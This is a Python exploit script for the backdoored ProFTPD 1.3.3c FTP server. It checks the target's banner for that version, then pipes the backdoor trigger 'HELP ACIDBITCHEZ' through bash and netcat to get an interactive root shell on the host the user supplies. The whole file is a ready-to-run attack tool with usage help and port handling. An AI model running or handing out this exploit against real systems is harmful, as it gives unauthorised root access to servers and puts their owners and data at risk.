#!/usr/bin/env python3

from termcolor import colored
from sys import argv
from time import sleep
import socket
import os


def Error(message):
    print(colored("[", "white", attrs=['bold']) + colored("!", 'red', attrs=['bold']) + colored("] ", "white", attrs=['bold']) + colored(message, "white", attrs=['bold'] ))

def Info(message):
    print(colored("[", "white",  attrs=['bold']) + colored("*", 'yellow', attrs=['bold']) + colored("] ", "white", attrs=['bold']) + colored(message, "white", attrs=['bold']))
def Good(message):
    print(colored("[", "white", attrs=['bold']) + colored("+", 'cyan', attrs=['bold']) + colored("] ", "white", attrs=['bold']) + colored(message, "white", attrs=['bold']))


def Checker(ip, port):

    s = socket.socket()
    s.connect((ip,port))
    sleep(1)
    a = s.recv(1024).decode("utf-8")

    if not "1.3.3c" in a:
        Error("Version must be ProFTPd 1.3.3c")
        exit()


def Exploit(ip,port):
    
    Info("Attempting to pop a root shell")
    os.system(f"""bash -c "cat <(echo 'HELP ACIDBITCHEZ') - | netcat {ip} {port}" """)


def main(ip, port):
    Info("Checking version")
    Checker(ip, port)
    Good("Version is ProFTPD 1.3.3c")
    Info("Launching exploit")
    sleep(1)
    Exploit(ip, port)


if __name__ == "__main__":

    # Check if first arg is given
    try:
        ip = argv[1]
    except:
        Error("usage : exploit.py <ip> <port>")
        exit()


    if ip in ["-h", "--help"]:
        Info("usage : ./exploit.py <ip> <port (default : 21)>")
        print(colored("\nExample:\nexploit.py example.com 345\nexploit.py 127.0.0.1\n", "white", attrs=['bold']))
        exit()

    # Test for second arg:

    # if port is given :
    try:
        port = argv[2]
    except:
        Info("No port supplied, using defaul port : 21")
        port = 21

    # if is int port given

    try:
        port = int(port)
    except:
        Error(f"{port} is not a valid port")
        exit() 

    # test if port is bigger than 65535 (illegal)
    if port > 65535:
        Error(f"{port} is not a valid port")
        exit()


    main(ip,port) 
